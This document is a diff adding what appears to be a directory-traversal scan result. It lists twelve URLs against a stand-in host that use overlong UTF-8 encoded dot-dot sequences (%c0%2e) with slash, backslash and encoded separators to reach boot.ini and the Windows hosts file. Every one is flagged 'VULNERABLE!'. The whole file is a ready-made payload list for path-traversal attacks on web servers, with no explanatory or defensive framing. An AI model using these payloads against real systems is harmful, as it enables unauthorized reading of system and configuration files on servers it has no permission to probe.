@@ -1,0 +1,24 @@
+
+http://www.example.com/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/boot.ini &lt;- VULNERABLE!
+
+http://www.example.com/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/windows/system32/drivers/etc/hosts &lt;- VULNERABLE!
+
+http://www.example.com/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\boot.ini &lt;- VULNERABLE!
+
+http://www.example.com/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\windows\system32\drivers\etc\hosts &lt;- VULNERABLE!
+
+http://www.example.com/%c0%2e%c0%2e%2f%c0%2e%c0%2e%2f%c0%2e%c0%2e%2fboot.ini &lt;- VULNERABLE!
+
+http://www.example.com/%c0%2e%c0%2e%2f%c0%2e%c0%2e%2f%c0%2e%c0%2e%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts &lt;- VULNERABLE!
+
+http://www.example.com/%c0%2e%c0%2e%5c%c0%2e%c0%2e%5c%c0%2e%c0%2e%5cboot.ini &lt;- VULNERABLE!
+
+http://www.example.com/%c0%2e%c0%2e%5c%c0%2e%c0%2e%5c%c0%2e%c0%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts &lt;- VULNERABLE!
+
+http://www.example.com/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fboot.ini &lt;- VULNERABLE!
+
+http://www.example.com/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts &lt;- VULNERABLE!
+
+http://www.example.com/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cboot.ini &lt;- VULNERABLE!
+
+http://www.example.com/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts &lt;- VULNERABLE!
